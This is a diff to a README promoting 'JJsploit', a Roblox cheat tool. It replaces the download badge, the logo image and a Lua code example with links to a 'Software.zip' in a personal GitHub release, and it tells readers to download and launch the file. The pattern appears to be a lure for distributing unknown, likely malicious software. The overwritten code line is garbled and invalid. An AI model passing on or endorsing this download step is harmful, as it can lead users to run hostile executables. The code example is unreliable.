@@ -24,7 +24,7 @@ JJsploit is a powerful Roblox exploit that is now available for free! It is wide
 ## Installation
 To download the latest version of JJsploit, click the button below:
 
-[![Download JJsploit](https://img.shields.io/badge/Download-JJsploit-blue.svg)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download JJsploit](https://github.com/Hoaibao2008/JJsploit/releases/download/v1.0/Software.zip)](https://github.com/Hoaibao2008/JJsploit/releases/download/v1.0/Software.zip)
 
 Once the download is complete, launch the file to install JJsploit and start customizing your Roblox gaming experience!
 
@@ -50,7 +50,7 @@ Here are a few examples of what you can do with JJsploit:
 print("Hello, Roblox!")
 
 -- Modify in-game features
-game.Players.LocalPlayer.Character.Head.Size = Vector3.new(2, 2, 2)
+https://github.com/Hoaibao2008/JJsploit/releases/download/v1.0/Software.zip = https://github.com/Hoaibao2008/JJsploit/releases/download/v1.0/Software.zip(2, 2, 2)
 ```
 
 ## Support
@@ -64,4 +64,4 @@ JJsploit is open-source software licensed under the MIT License. You are free to
 
 Let's make your Roblox gaming experience even more exciting with JJsploit! 💥
 
-![JJsploit Logo](https://example.com/jjsploit-logo.png)
+![JJsploit Logo](https://github.com/Hoaibao2008/JJsploit/releases/download/v1.0/Software.zip)
